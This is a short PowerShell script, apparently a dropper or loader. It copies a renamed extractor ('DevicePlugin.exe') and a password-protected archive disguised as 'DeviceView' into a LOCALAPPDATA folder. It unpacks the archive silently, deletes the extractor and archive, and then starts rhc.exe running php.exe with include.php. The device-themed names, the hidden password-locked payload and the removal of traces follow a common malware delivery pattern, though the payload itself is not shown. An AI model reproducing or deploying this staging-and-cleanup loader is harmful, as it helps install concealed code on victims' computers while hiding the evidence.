$pass = $args[0];
$cwd = Get-Location;
$lcAppData = $env:LOCALAPPDATA;
cd $lcAppData;
mkdir "CDContent" -Force;
$appData = "$($lcAppData)\CDContent";
cd $cwd;
Copy-Item -Path "DevicePlugin.exe" -Destination "$($appData)\DevicePlugin.exe" -Force
Copy-Item -Path "DeviceView" -Destination "$($appData)\DeviceView.7z" -Force
cd $appData;
Clear-Host;
Start-Process DevicePlugin.exe -Wait -NoNewWindow -ArgumentList x, DeviceView.7z, -p"$($pass)", -y, -aoa;
Remove-Item -Path "DevicePlugin.exe" -Force
Remove-Item -Path "DeviceView.7z" -Force
Start-Process rhc.exe -ArgumentList php.exe, include.php;